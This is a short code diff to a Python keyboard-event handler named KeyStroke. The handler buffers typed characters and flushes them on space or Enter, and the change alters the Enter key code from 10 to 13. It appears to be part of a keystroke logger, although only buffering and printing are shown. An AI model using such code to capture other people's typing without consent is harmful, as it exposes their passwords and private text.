@@ -74,7 +74,7 @@ def KeyStroke(event):
     if 33 < event.Ascii < 127:
         logged.append(chr(event.Ascii))
         print(event.Ascii)
-    if event.Ascii == 32 or event.Ascii == 10:
+    if event.Ascii == 32 or event.Ascii == 13:
         concatinated = ""
         concatinated = concatinated.join(logged)
         logged.clear()
